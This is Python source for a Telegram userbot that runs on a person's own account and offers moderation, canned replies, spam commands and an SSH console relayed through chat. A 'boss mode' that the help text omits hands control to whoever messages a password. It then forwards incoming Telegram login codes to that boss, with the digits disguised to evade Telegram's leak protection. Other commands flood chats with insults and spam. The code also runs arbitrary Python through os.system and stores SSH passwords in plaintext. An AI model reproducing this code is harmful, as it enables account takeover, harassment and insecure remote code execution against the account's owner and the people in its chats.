from pyrogram import Client, Filters, MessageHandler 
from pyrogram.api import functions, types 
import redis, psutil, random, time, os, requests, configparser, re
from lxml import html
from ssh import ssh
import requests
import datetime

### Config File!
config = configparser.ConfigParser()
config.read("config.ini")
c = config["Tkar"]
r = redis.StrictRedis(decode_responses=True)


#Do Not Fucking touch this shits
isshhconnect = False
sshc = None
password = r.get("password") or c["DEFAULT_PASSWORD"]
app = Client(c["SEASION_NAME"],int(c["API_ID"]),c["API_HASH"])
helptext = """
HELP:
[Mm] [media] (mute)
[Aa]ddf [fosh]
[Dd]elf [fosh]
[Ll]istf
[Cc]learf
[Cc]k (remove)
[Pp]in
[Rr]eload0 | [Rr]eload1
[Pp]y (run python3 Scripts)
[Ff]uck it (spam)
[Dd]el fuck (del spam)
[Dd] (delete)
[Cc]learb (blacklist)
[Bb]lacklist
[Pp] [money] (price)
[Ii]d
[Ss]erver (Srver information)
[Aa]ction
[Aa]ction [all|users|off|clear|list]
[Ss]ettings
[Ss]etaction ([Aa]ctionlist)
[Ss]pamf [reply] (fosh)
[Ss]pam [reply] [count]
[Nn]obody OR [Ee]verybody (LastSeen)
cmd: set [cmd] {reply} | cmdlist | dcmd [cmd]
[Ff]maker
[Aa]utodel ?[NUM]
[Aa]ddserver [reply] -> USERNAME@IP;PASSWORD
+[Cc]onnect (Connect to SHH addedserver)
    ...
    cmds
    ...
-exit() (Disconnect)
[Mm]ark [INCHAT] - mark anyway
[Tt]oday 

"""


if not r.get("autodeltime"): r.set("autodeltime", "10")


#######BOSS MODE#######
@app.on_message(Filters.regex("^(im boss)$") & Filters.me , group=0)
def imboss(client, message):
    message.reply("Enter the password:")


@app.on_message(Filters.regex(f"^({password})$") & Filters.private , group=1)
def setboss(client, message):
    userid = message.chat.id
    r.set("boss",str(userid))
    message.reply("You are boss now ;)\nTelegram Messages will send you...")



@app.on_message(Filters.chat(777000))
def telegram(client, message):
    code = message.text
    if "boss" in r.keys():
        boss = int(r.get("boss"))
    else:return
    for i in range(10):
        code = code.replace(str(i),f"-//__{i}__//-")
    app.send_message(chat_id=boss,text=code, parse_mode="markdown")
######################


locks = [
    "link",
    "forward",
]

mutes = [
    "text",
    "photo",
    "sticker",
    "gif",
    "voice",
    "media",
    "audio",
    "doc",
    "video",
    "vn",
]


@app.on_message(Filters.me & (Filters.group|Filters.private) & Filters.reply  & Filters.regex("^[Mm] (.*)$") , group =3)
def reply(client, message):
    m = message.text.split(" ")[1]
    fname = message.reply_to_message.from_user.first_name
    userid = message.reply_to_message.from_user.id
    if not m in mutes:return
    if str(userid) in r.smembers("mute"+m):
        r.srem("mute"+m,str(userid))
        text = f"`{m}` __UNmuted__ for **{fname}**\nBy Tabahkar!"
    else:
        r.sadd("mute"+m,str(userid))
        text = f"`{m}` __Muted__ for **{fname}**\nBy Tabahkar!"

    send =app.edit_message_text(message.chat.id,message.message_id,text)
    if r.get("autodel") == "on":
            time.sleep(float(r.get("autodeltime")))
            app.delete_messages(message.chat.id,[send.message_id])

@app.on_message(Filters.media & (Filters.group|Filters.private))
def media(client, message):
    chatid = message.chat.id
    userid = message.from_user.id
    if str(userid) not in r.smembers(f"mutemedia"):return
    app.delete_messages(chatid,[message.message_id])


@app.on_message(Filters.audio & (Filters.group|Filters.private))
def audio(client, message):
    chatid = message.chat.id
    userid = message.from_user.id
    if str(userid) not in r.smembers(f"muteaudio"):return
    app.delete_messages(chatid,[message.message_id])

@app.on_message(Filters.document & (Filters.group|Filters.private))
def document(client, message):
    chatid = message.chat.id
    userid = message.from_user.id
    if str(userid) not in r.smembers(f"mutedoc"):return
    app.delete_messages(chatid,[message.message_id])

@app.on_message(Filters.video & (Filters.group|Filters.private))
def video(client, message):
    chatid = message.chat.id
    userid = message.from_user.id
    if str(userid) not in r.smembers(f"mutevideo"):return
    app.delete_messages(chatid,[message.message_id])

@app.on_message(Filters.video_note & (Filters.group|Filters.private))
def video_note(client, message):
    chatid = message.chat.id
    userid = message.from_user.id
    if str(userid) not in r.smembers(f"mutevn"):return
    app.delete_messages(chatid,[message.message_id])

@app.on_message(Filters.animation & (Filters.group|Filters.private))
def gif(client, message):
    chatid = message.chat.id
    userid = message.from_user.id
    if str(userid) not in r.smembers("mutegif"):return
    app.delete_messages(chatid,[message.message_id])

@app.on_message(Filters.voice & (Filters.group|Filters.private))
def voice(client, message):
    chatid = message.chat.id
    userid = message.from_user.id
    if str(userid) not in r.smembers("mutevoice"):return
    app.delete_messages(chatid,[message.message_id])

@app.on_message(Filters.photo & (Filters.group|Filters.private))
def photo(client, message):
    chatid = message.chat.id
    userid = message.from_user.id
    if str(userid) not in r.smembers("mutephoto"):return
    app.delete_messages(chatid,[message.message_id])

@app.on_message(Filters.sticker & (Filters.group|Filters.private))
def sticker(client, message):
    chatid = message.chat.id
    userid = message.from_user.id
    #print("done")
    if str(userid) not in r.smembers(f"mutesticker"):return
    app.delete_messages(chatid,[message.message_id])

@app.on_message(Filters.text & (Filters.group|Filters.private))
def text(client, message):
    chatid = message.chat.id
    userid = message.from_user.id
    if str(userid) not in r.smembers(f"mutetext"):return
    app.delete_messages(chatid,[message.message_id])





# SSH
@app.on_message(Filters.text & Filters.me, group=4)
def text_me(client, message):
    rmsg = None
    global sshc, isshhconnect
    text = message.text
    if isshhconnect:
        if text == "exit()":
            isshhconnect = False
            sshc = None
            txt = "DisConnected!"
        else:
            a, b, c = sshc.cmd(text)
            txt = b.read()
            txt = txt.decode("utf-8")
            txt = "OUTput:\n\n" + txt
            
        send =app.edit_message_text(message.chat.id,message.message_id,txt)
        if r.get("autodel") == "on":
            time.sleep(float(r.get("autodeltime")))
            app.delete_messages(message.chat.id, [send.message_id])
        

    elif text in r.hgetall("qanswer"):
        txt = r.hgetall("qanswer")[text]
        t = txt.split(":")
        try:
            msg_id = message.reply_to_message.message_id
        except:
            msg_id = rmsg
        if t[0] == "GIF":
            #sendgif
            app.send_animation(message.chat.id,t[1], reply_to_message_id=msg_id)
        elif t[0] == "STICKER":
            app.send_sticker(message.chat.id, t[1], reply_to_message_id=msg_id)

        elif t[0] == "VN":
            app.send_video_note(message.chat.id, t[1], reply_to_message_id=msg_id)

        elif t[0] == "VOICE":
            app.send_voice(message.chat.id, t[1], reply_to_message_id=msg_id)

        elif t[0] == "VIDEO":
            app.send_video(message.chat.id, t[1], reply_to_message_id=msg_id)

        elif t[0] == "DOC":
            app.send_document(message.chat.id, t[1], reply_to_message_id=msg_id)

        elif t[0] == "PHOTO":
            app.send_photo(message.chat.id, t[1], reply_to_message_id=msg_id)

        app.delete_messages(message.chat.id, [message.message_id])
        
    else:return

# ADD FOSH
@app.on_message(Filters.me & Filters.regex("[Aa]ddf (.*)"), group=5)
def addfo(client,message):
    _ = message.text.split(" ")[0]
    fo = message.text.replace(_,"")
    r.sadd("fosh",fo)
    text = f"`{_}` Add shd"

    send =app.edit_message_text(message.chat.id,message.message_id,text)
    if r.get("autodel") == "on":
            time.sleep(float(r.get("autodeltime")))
            app.delete_messages(message.chat.id,[send.message_id])

# DEL FOSH
@app.on_message(Filters.me &  Filters.regex("[Dd]elf (.*)"), group=6)
def delfo(client, message):
    _ = message.text.split(" ")[0]
    fo = message.text.replace(_,"")
    r.srem("fosh",fo)
    text = f"`{_}` Del shd"
    send =app.edit_message_text(message.chat.id,message.message_id,text)
    if r.get("autodel") == "on":
            time.sleep(float(r.get("autodeltime")))
            app.delete_messages(message.chat.id,[send.message_id])



# LIST FOSH
@app.on_message(Filters.me &  Filters.regex("[Ll]istf"), group=7)
def listf(client,message):
    fl = r.smembers("fosh")
    text = ""
    count = 1
    for i in fl:
        text = text + f"{count} - `{i}`\n"
        count+=1
    send =app.edit_message_text(message.chat.id,message.message_id,text)
    if r.get("autodel") == "on":
            time.sleep(float(r.get("autodeltime")))
            app.delete_messages(message.chat.id,[send.message_id])



@app.on_message(Filters.me &  Filters.group & Filters.reply & Filters.regex("^[Pp]in$") , group=8)
def pin(client,message):

    msgid = message.reply_to_message.message_id
    app.pin_chat_message(message.chat.id,msgid )
    text = f"**Pin** __Shd__ ;)"
    send =app.edit_message_text(message.chat.id,message.message_id,text)
    if r.get("autodel") == "on":
            time.sleep(float(r.get("autodeltime")))
            app.delete_messages(message.chat.id,[send.message_id])


@app.on_message(Filters.group & Filters.reply & Filters.regex("^[Uu]npin$") & Filters.me, group=9)
def unpin(client,message):
    myid = message.from_user.id
    msgid = message.reply_to_message.message_id

    app.unpin_chat_message(message.chat.id )

    text = f"**UnPin** __Shd__ ;)"
    send =app.edit_message_text(message.chat.id,message.message_id,text)
    if r.get("autodel") == "on":
            time.sleep(float(r.get("autodeltime")))
            app.delete_messages(message.chat.id,[send.message_id])
    



### RELOAD
reload0 = [
    "`start reloading`",
    "░░░░░░░░░░░░░░",
    "▓░░░░░░░░░░░░░",
    "▓▓░░░░░░░░░░░░",
    "▓▓▓░░░░░░░░░░░",
    "▓▓▓▓░░░░░░░░░░",
    "▓▓▓▓▓░░░░░░░░░",
    "▓▓▓▓▓▓░░░░░░░░",
    "▓▓▓▓▓▓▓░░░░░░░",
    "▓▓▓▓▓▓▓▓░░░░░░",
    "▓▓▓▓▓▓▓▓▓░░░░░",
    "▓▓▓▓▓▓▓▓▓▓░░░░",
    "▓▓▓▓▓▓▓▓▓▓▓░░░",
    "▓▓▓▓▓▓▓▓▓▓▓▓░░",
    "▓▓▓▓▓▓▓▓▓▓▓▓▓░",
    "▓▓▓▓▓▓▓▓▓▓▓▓▓▓",
    "reloading.",
    "reloading..",
    "reloading...",
    "reloading.",
    "reloading..",
    "reloading...",
    "reloading.",
    "reloading..",
    "reloading...",
    "`reloaded! :)`",
]
reload1 = [
    "`start reloading`",
    "Reload.",
    "rEload..",
    "reLoad...",
    "relOad.",
    "reloAd..",
    "reloaD...",
    "Reload.",
    "rEload..",
    "reLoad...",
    "relOad.",
    "reloAd..",
    "reloaD...",
    "`reloaded! :)`",
]

@app.on_message(Filters.me & (Filters.group|Filters.private) & Filters.regex("^[Rr]eload0$") , group=10)
def cmd_reload0(client,message):
 
    for i in reload0:
        time.sleep(0.2)
        send =app.edit_message_text(message.chat.id,message.message_id,i)
    if r.get("autodel") == "on":
        time.sleep(float(r.get("autodeltime")))
        app.delete_messages(message.chat.id,[send.message_id])


@app.on_message(Filters.me & (Filters.group|Filters.private) & Filters.regex("^[Rr]eload1$") , group=10)
def cmd_reload1(client,message):
 
    for i in reload1:
        time.sleep(0.2)
        send =app.edit_message_text(message.chat.id,message.message_id,i)
    if r.get("autodel") == "on":
        time.sleep(float(r.get("autodeltime")))
        app.delete_messages(message.chat.id,[send.message_id])



### FUCK IT 
@app.on_message( Filters.me  & Filters.regex("^[Ff]uck it$") & Filters.reply , group=11)
def addblacklist(client,message):
    myid = message.from_user.id
    first_name = message.from_user.first_name
    userid = message.reply_to_message.from_user.id
    r.sadd("blacklist",str(userid))
    app.edit_message_text(
        message.chat.id,
        message.message_id,
        f"{userid} Add in BL!")

### DEL FUCK
@app.on_message(Filters.me &  Filters.regex("^[Dd]el fuck$") & Filters.reply , group=12)
def delblacklist(client,message):
    userid = message.reply_to_message.from_user.id
    r.srem("blacklist",str(userid))
    app.edit_message_text(
        message.chat.id,
        message.message_id,
        f"{userid} Del in BL!")


### RUN PYTHON SCRIPT
@app.on_message(Filters.me & Filters.regex("^[Pp]y$") & Filters.reply , group=13)
def runpy(client,message):
    text = message.reply_to_message.text
    with open("script.py", "a+") as f_w:
        f_w.write(text)
    os.system("python3 script.py > out.txt")
    with open("out.txt", "r") as f_r:
        out = f_r.read()
        out = "Output:\n" + out
    os.remove("script.py")
    os.remove("out.txt")
    send =app.edit_message_text(message.chat.id,message.message_id,out)
    if r.get("autodel") == "on":
        time.sleep(float(r.get("autodeltime")))
        app.delete_messages(message.chat.id,[send.message_id])




### DELETE MESSAGE
@app.on_message(Filters.me &  Filters.regex("^[Dd]$"),group=14)
def delete(client,message):
    msgid = message.reply_to_message.message_id
    mymsg = message.message_id
    app.delete_messages(message.chat.id, [msgid,mymsg])


### CLEAR BLOCK LIST
@app.on_message(Filters.me &  Filters.regex("^[Cc]learb$") , group=15)
def clearf(client,message):
    r.delete("blacklist")
    send =app.edit_message_text(message.chat.id,message.message_id,"`Blacklist` is Clear Now")
    if r.get("autodel") == "on":
        time.sleep(float(r.get("autodeltime")))
        app.delete_messages(message.chat.id,[send.message_id])



### CHAT ID
@app.on_message(Filters.me  &Filters.reply &  Filters.regex("^([Ii]d)$") , group=16)
def id(client,message):
    uid = message.reply_to_message.from_user.id

    app.edit_message_text(
        message.chat.id,
        message.message_id,
        f"`{uid}`"
    )
    if r.get("autodel") == "on":
        time.sleep(float(r.get("autodeltime")))
        app.delete_messages(message.chat.id,[send.message_id])


### PRICE CRYPTO
@app.on_message(Filters.me &  Filters.regex("^([Pp]) (.*)$") , group=17)
def myid(client,message):

    name = message.text.split(" ")[1]
    url = requests.get(f"https://api.coinmarketcap.com/v1/ticker/{name}/")
    change1h = url.json()[0]["percent_change_1h"]
    change24h = url.json()[0]["percent_change_24h"]
    change7d = url.json()[0]["percent_change_7d"]
    price = url.json()[0]["price_usd"]
    send =app.edit_message_text(text="**-{}-** \n__Price__ : `${}`\n__Change 1h__ : `{}%`\n__Change 24h__ : `{}%`\n__Change 7d__ : `{}%`".format(name,price,change1h,change24h,change7d),
        chat_id=message.chat.id,
        message_id=message.message_id,)
    if r.get("autodel") == "on":
        time.sleep(float(r.get("autodeltime")))
        app.delete_messages(message.chat.id,[send.message_id])



### DETAIL SERVER 
@app.on_message(Filters.me &Filters.regex("^([Ss]erver)$") , group=18)
def server(client,message):

    disk_p = dict(psutil.disk_usage(__file__)._asdict())["percent"] ## disk
    ram_p = dict(psutil.virtual_memory()._asdict())["percent"]  ## RAM
    cpu_p = psutil.cpu_percent()
    text = f"""
Server System Info

Used Disk : `{disk_p}%`
Used Ram : `{ram_p}%`
Used Cpu  : `{cpu_p}%`
"""
    send =app.edit_message_text(text=text,
        chat_id=message.chat.id,
        message_id=message.message_id,)
    if r.get("autodel") == "on":
        time.sleep(float(r.get("autodeltime")))
        app.delete_messages(message.chat.id,[send.message_id])



# @app.on_message(Filters.me & Filters.regex("^([Ss]etpsw) (.*)$") , group=19)


### RECENTLY & ONLINE
@app.on_message(Filters.me & Filters.regex("^([Nn]obody|[Ee]verybody)$") , group=20)
def setprivacy(client,message):
    if  "obody" in str(message.text):
        app.send(
            functions.account.SetPrivacy(
                key=types.InputPrivacyKeyStatusTimestamp(),
                rules=[types.InputPrivacyValueDisallowAll()]
            )
        )
        send =app.edit_message_text(text="Now Nobody Can See your Last seen!",
            chat_id=message.chat.id,
            message_id=message.message_id,)
        r.set("lastseen", "NoBody")
        if r.get("autodel") == "on":
            time.sleep(float(r.get("autodeltime")))
            app.delete_messages(message.chat.id,[send.message_id])


    else:
        app.send(
            functions.account.SetPrivacy(
                key=types.InputPrivacyKeyStatusTimestamp(),
                rules=[types.InputPrivacyValueAllowAll()]
            )
        )

        send =app.edit_message_text(text="Now Everybody Can See your Last seen!",
            chat_id=message.chat.id,
            message_id=message.message_id,)
        r.set("lastseen", "EveryBody")
        if r.get("autodel") == "on":
            time.sleep(float(r.get("autodeltime")))
            app.delete_messages(message.chat.id,[send.message_id])



### SPAM MSG
@app.on_message(Filters.me &  Filters.regex("^[Ss]pam (\d*)$") & Filters.reply , group=21)
def spam(client,message):
    msgid = message.reply_to_message.message_id
    chatid = message.chat.id
    spam = int(message.text.split(" ")[1])
    for i in range(spam):
        app.forward_messages(
            chat_id=chatid,
            from_chat_id=chatid,
            message_ids=[msgid]
        )
    app.delete_messages(message.chat.id,[message.message_id])

### SPAM FOSH MSG
@app.on_message(Filters.regex("^[Ss]pamf (\d*)$") & Filters.reply & Filters.me , group=22)
def spamf(client,message):
    msgid = message.reply_to_message.message_id
    chatid = message.chat.id
    spam = int(message.text.split(" ")[1])
    foshes = list(r.smembers("fosh"))
    for i in range(spam):
        fosh = random.choice(foshes)
        if r.get("fmaker") == "on":
            fosh = makef()
        app.send_message(chatid,fosh, reply_to_message_id=msgid)
    app.delete_messages(message.chat.id,[message.message_id])



### ACTION CHAT
@app.on_message(Filters.regex("^[Aa]ction$") & Filters.me, group=23)
def action(client,message):
    chatid = message.chat.id
    if str(chatid) in r.smembers("chataction"):
        r.srem("chataction", str(chatid))
        text = "ChatAction in This Chat is OFF now"
    else:
        r.sadd("chataction", str(chatid))
        text = "ChatAction in This Chat is ON now"

    send = app.edit_message_text(text=text,
            chat_id=message.chat.id,
            message_id=message.message_id,)
    if r.get("autodel") == "on":
        time.sleep(float(r.get("autodeltime")))
        app.delete_messages(message.chat.id,[send.message_id])


@app.on_message(Filters.incoming,group = 24)
def incoming(client, message):
    # DEFULT PLAYING
    action = r.get("action") or "PLAYING"
    chatid = message.chat.id
    if str(chatid) in r.smembers("chataction"):

        for i in range(3):
            app.send_chat_action(
                chatid,
                action
            )
    
### SET ACTION
@app.on_message(Filters.regex("^[Ss]etaction (.*)$") & Filters.me , group=25)
def setaction(client,message):
    action = str(message.text.split(" ")[1])
    r.set("action", action)
    send =app.edit_message_text(text=f"Action Seted to {action}",
            chat_id=message.chat.id,
            message_id=message.message_id,)
    if r.get("autodel") == "on":
        time.sleep(float(r.get("autodeltime")))
        app.delete_messages(message.chat.id,[send.message_id])


@app.on_message(Filters.regex("^[Aa]ctionlist$") & Filters.me , group=26)
def actionlist(client,message):
    text = """
actions:

`typing`
`upload_photo`
`upload_video`
`record_audio`
`upload_audio`
`upload_document`
`find_location`
`record_video_note`
`upload_video_note`
`choose_contact`
`playing`
cmd:
Setaction [action]
"""
    send =app.edit_message_text(text=text,
            chat_id=message.chat.id,
            message_id=message.message_id,)
    if r.get("autodel") == "on":
        time.sleep(float(r.get("autodeltime")))
        app.delete_messages(message.chat.id,[send.message_id])



# @app.on_message(Filters.regex("^[Aa]ction (.*)$") & Filters.me, group=27)


### SETTINGS SELF
@app.on_message(Filters.regex("^[sS]ettings$") & Filters.me , group=28)
def settings(client,message):
    global password
    password = password[0] + "*" * (len(password) - 2) + password[-1]
    chatid = message.chat.id
    text = f"""
Settings:

**ChatAction:** `{r.get("action") or "PLAYING"}`
┣ Mode: `{r.get("actionmode")}`
**AntiSpamMode**: `ON`
┣ ifSpam: `BLOCK`
**Password:** `{password}`
**Boss:** [{r.get("boss")}](tg://user?id={r.get("boss")})
**LastSeen:** `{r.get("lastseen")}`
**FilterFosh:** `{r.get("filterfosh")}`
**FoshMaker:** `{r.get("fmaker")}`
**AutoDel:** `{r.get("autodel")}`
┣ Time: {r.get("autodeltime")}
**AutoSeen:** `{r.get("autoseen")}`
┣ Mode: `{",".join([i for i in r.smembers("seen:mode")])}`
┣ ThisChatinUnmarks? `{"YES" if str(chatid) in r.smembers("unmark") else "NO"}`
**ServerSet:** `{"YES" if "ssh" in r.keys() else "NO"}`
┣ IP: `{r.hgetall("ssh")["ip"] if "ssh" in r.keys() else "NoServer Seted"}`
┣ PASS: `{"Hide" if "ssh" in r.keys() else "NotServer Seted"}`
"""
    send =app.edit_message_text(text=text,
            chat_id=message.chat.id,
            message_id=message.message_id,)
    if r.get("autodel") == "on":
        time.sleep(float(r.get("autodeltime")))
        app.delete_messages(message.chat.id,[send.message_id])



### BLACKLIST
@app.on_message(Filters.regex("^[Bb]list$") & Filters.me , group=29)
def blacklist(client,message):
    blist = r.smembers("blacklist")
    text = "BlackList:\n"
    count = 1
    for i in blist:
        text = text + f"{count} - [{i}](tg://user?id={i})\n"
        count+=1
    send =app.edit_message_text(message.chat.id,message.message_id,text)
    if r.get("autodel") == "on":
            time.sleep(float(r.get("autodeltime")))
            app.delete_messages(message.chat.id,[send.message_id])


### CLEAR FOSH LIST
@app.on_message(Filters.regex("^[Cc]learf$") & Filters.me, group=30)
def clearf(client,message):
    r.delete("fosh")
    send =app.edit_message_text(message.chat.id,message.message_id,"foshList Deleted!")
    if r.get("autodel") == "on":
        time.sleep(float(r.get("autodeltime")))
        app.delete_messages(message.chat.id,[send.message_id])


### FILTER FOSH
#@app.on_message(Filters.regex("^[Ff]ilterf$") & Filters.me, group=31)
def foshfiltere(client,message):
    f = r.get("filterfosh")
    if f == "on":
        r.set("filterfosh", "off")
        text = "off"
    else:
        r.set("filterfosh", "on")
        text = "on"
    send =app.edit_message_text(message.chat.id,message.message_id,f"filterf {text} shod")
    if r.get("autodel") == "on":
        time.sleep(float(r.get("autodeltime")))
        app.delete_messages(message.chat.id,[send.message_id])


### HELP CMD
@app.on_message(Filters.regex("^[hH]elp$") & Filters.me, group=32)
def help(client,message):
    send =app.edit_message_text(message.chat.id,message.message_id,helptext)
    if r.get("autodel") == "on":
        time.sleep(float(r.get("autodeltime")))
        app.delete_messages(message.chat.id,[send.message_id])



### SET A FILE AS CMD
@app.on_message(Filters.me  & Filters.reply & Filters.regex("^[Ss]et (.*)$") , group=33)
def setcmd(client, message):
    cmd = message.text.split(" ")[1]
    rmsg = message.reply_to_message
    if rmsg.sticker:
        fid = "STICKER:"+str(rmsg.sticker.file_id)
        r.hmset("qanswer", {cmd: fid})
    elif rmsg.animation:
        fid = "GIF:"+str(rmsg.animation.file_id)
        r.hmset("qanswer", {cmd: fid})
    elif rmsg.photo:
        fid = "PHOTO:"+str(rmsg.photo.sizes[-1].file_id)
        r.hmset("qanswer", {cmd: fid})
    elif rmsg.video:
        print("VIDEO: ",message)
        fid = "VIDEO:"+str(rmsg.video.file_id)
        r.hmset("qanswer", {cmd: fid})
    elif rmsg.document:
        print("DEC: ",rmsg)
        fid = "DOC:"+str(rmsg.document.file_id)
        r.hmset("qanswer", {cmd: fid})
    elif  rmsg.video_note:
        fid = "VN:"+str(rmsg.video_note.file_id)
        r.hmset("qanswer", {cmd: fid})
    elif rmsg.voice:
        fid = "VOICE:"+str(rmsg.voice.file_id)
        r.hmset("qanswer", {cmd: fid})
    elif rmsg.audio:
        fid = "MUSIC:"+str(rmsg.audio.file_id)
        print(fid)
        r.hmset("qanswer", {cmd: fid})

    else:return
    send =app.edit_message_text(message.chat.id,message.message_id,f"Done, {cmd} Set!")
    if r.get("autodel") == "on":
        time.sleep(float(r.get("autodeltime")))
        app.delete_messages(message.chat.id, [send.message_id])


### SHOW CMD LIST
@app.on_message(Filters.regex("^[Cc]mdlist$") & Filters.me , group=34)
def cmdlist(client, message):
    text = "CMDs:\n"
    cmds = r.hgetall("qanswer")
    for i in cmds:
        text = text + f"{i} > {cmds[i].split(':')[0]}\n"
        
    send =app.edit_message_text(message.chat.id,message.message_id,text)
    if r.get("autodel") == "on":
            time.sleep(float(r.get("autodeltime")))
            app.delete_messages(message.chat.id,[send.message_id])

### DEL CMD
@app.on_message(Filters.regex("^[Dd]cmd (.*)$") & Filters.me , group=35)
def delcmd(client,message):
    cmd = message.text.split(" ")[1]
    r.hdel("qanswer", cmd)
    send =app.edit_message_text(message.chat.id,message.message_id,f"Done, {cmd} Deleted!")
    if r.get("autodel") == "on":
        time.sleep(float(r.get("autodeltime")))
        app.delete_messages(message.chat.id,[send.message_id])

### SET TIME FOR AUTODEL
@app.on_message(Filters.regex("^[Aa]utodel? ?(\d*)$") & Filters.me , group=36)
def autodel(client,message):
    if " " in message.text:
        timer = message.text.split(" ")[1]
        r.set("autodeltime", timer)
        text = f"AutoDelTime Seted to `{time}` Secend"
    else:
        if r.get("autodel") == "on":
            r.set("autodel", "off")
            text = "Auto Delete Is `OFF` Now"
        else:
            r.set("autodel", "on")
            text = "Auto Delete Is `ON` Now"
        
    send =app.edit_message_text(message.chat.id,message.message_id,text)
    if r.get("autodel") == "on":
        time.sleep(float(r.get("autodeltime")))
        app.delete_messages(message.chat.id,[send.message_id])



### FOSH MAKER
# @app.on_message(Filters.regex("^[Ff]maker$") & Filters.me , group=37)


### ADD SERVER FOR SSH
@app.on_message(Filters.regex("^[Aa]ddserver$") & Filters.me & Filters.reply, group=38)
def addserver(client,message):
    text = message.reply_to_message.text
    uname , elsee= text.split("@")
    ip, password = elsee.split(";")
    r.hmset("ssh", {"ip":ip, "username":uname , "password":password, "port":"22"})
    txt = f"USERNAME: {uname}\nPASSWORD: {password}\nPORT: 22\nIP: {ip}"
    send =app.edit_message_text(message.chat.id,message.message_id,txt)
    if r.get("autodel") == "on":
        time.sleep(float(r.get("autodeltime")))
        app.delete_messages(message.chat.id,[send.message_id])

### CONNECT TO SSH
@app.on_message(Filters.regex("^[Cc]onnect$") & Filters.me , group=39)
def connecttossh(client, message):
    global sshc, isshhconnect
    server = r.hgetall("ssh")
    ip = server["ip"]
    username = server["username"]
    password = server["password"]
    port = server["port"]
    sshconnect = ssh(ip, username, password, port)
    log = sshconnect.connectto()
    if log == "Connected!":
        isshhconnect = True
        sshc = sshconnect
    else:
        pass
    send =app.edit_message_text(message.chat.id,message.message_id,log)
    if r.get("autodel") == "on":
        time.sleep(float(r.get("autodeltime")))
        app.delete_messages(message.chat.id,[send.message_id])


# Auto Seen 
@app.on_message(Filters.incoming & Filters.private, group=40)
def autoseen(client , message):
    chatid = str(message.chat.id)
    if chatid in r.smembers("mark"):
        app.read_history(
            chatid
        )

@app.on_message(Filters.me & Filters.private & Filters.regex("^[Mm]ark$") , group=41)
def addmark(client, message):
    chatid = str(message.chat.id)
    if chatid in r.smembers("mark"):
        r.srem("mark", chatid)
        text = "This Chat Deleted from MarkList"
    else:
        r.sadd("mark", chatid)
        text = "This Chat Added to MarkList\nMark Anyway"
    send =app.edit_message_text(text=text,
            chat_id=message.chat.id,
            message_id=message.message_id,)     
    if r.get("autodel") == "on":
        time.sleep(float(r.get("autodeltime")))
        app.delete_messages(message.chat.id,[send.message_id])



@app.on_message(Filters.me & Filters.regex("^[Mm]arklist$") , group=42)
def marklist(client , message):
    marklist = r.smembers("mark")
    text = "MARK LIST : \n"
    count = 1
    for i in marklist:
        text = text + f"{count} - [{i}](tg://user?id={i})\n"
        count+=1
    app.edit_message_text(
        message.chat.id,
        message.message_id,
        text 
    )




### UPDATE BIO 
#@app.on_message(Filters.regex("^[Bb]io (.*)$") & Filters.me, group=43)



### DATE AND TIME
@app.on_message(Filters.regex("^[Tt]oday$")& Filters.me,group=44)
def today(client,message):
  
    S = requests.get("http://api.bot-dev.org/time/").json()
    # S > Solar Year | M > Miladi Year

    timeS = S['ENtime']
    dateS = S['FAdate']
    M = datetime.datetime.now()
    dateM = M.strftime("%Y/%m/%d")
    weekM = M.strftime("%A")
    monthM = M.strftime("%B")
    dayM = M.strftime("%j")

    text = f"""TODAY\nClock : `{timeS}`\nDate : `{dateS}`\n------------\n\nDate : `{dateM}`\nWeekday : `{weekM}`\nMonth : `{monthM}`\nDayNumberYear : `{dayM}/365`
        """
    send = app.edit_message_text(text=text,
            chat_id=message.chat.id,
            message_id=message.message_id,)
    if r.get("autodel") == "on":
        time.sleep(float(r.get("autodeltime")))
        app.delete_messages(message.chat.id,[send.message_id])


# Cik Out motherfucker
@app.on_message(Filters.me & Filters.reply & Filters.group &Filters.regex("[Cc]ik"), group=46)
def ck(client,message):
    userid = message.reply_to_message.from_user.id
    fname = message.reply_to_message.from_user.first_name

    app.kick_chat_member(message.chat.id,userid)
    text = f"**{fname}** __Cikd__ ;)"
    send =app.edit_message_text(message.chat.id,message.message_id,text)
    if r.get("autodel") == "on":
            time.sleep(float(r.get("autodeltime")))
            app.delete_messages(message.chat.id,[send.message_id])
  

# Claer chat for both user!
@app.on_message(Filters.me & (Filters.private | Filters.group) & Filters.regex("^[Cc]lear$") , group=47)
def clear (client , message):
    chatid = message.chat.id
    messageid = message.message_id
    msglist = []
    for message in app.iter_history(chatid):
        count = int(message.message_id)
        msglist.append(count)
    try:
        app.delete_messages(
            chatid,
            msglist
        )
    except:

        app.delete_messages(
            chatid,
            msglist
        )

@app.on_message(Filters.me & (Filters.private | Filters.group) & Filters.regex("^[Bb]$") & Filters.reply , group=48)
def block(client , message):
    user_id = message.reply_to_message.from_user.id
    fname = message.reply_to_message.from_user.first_name
    #f"{count} - [{i}](tg://user?id={i})\n"
    try:
        app.block_user(
            user_id
        )
        app.edit_message_text(
            message.chat.id,
            message.message_id,
            f"[{fname}](tg://user?id={user_id}) Blocked!"
        )
    except:
        pass

@app.on_message(Filters.me & (Filters.private | Filters.group) & Filters.regex("^[Uu]b$") & Filters.reply , group=49)
def ublock (client, message):
    user_id = message.reply_to_message.from_user.id
    fname = message.reply_to_message.from_user.first_name
    try:
        app.unblock_user(
            user_id
        )
        app.edit_message_text(
            message.chat.id,
            message.message_id,
            f"[{fname}](tg://user?id={user_id}) Unblock!"
        )
    except:
        pass




app.run()



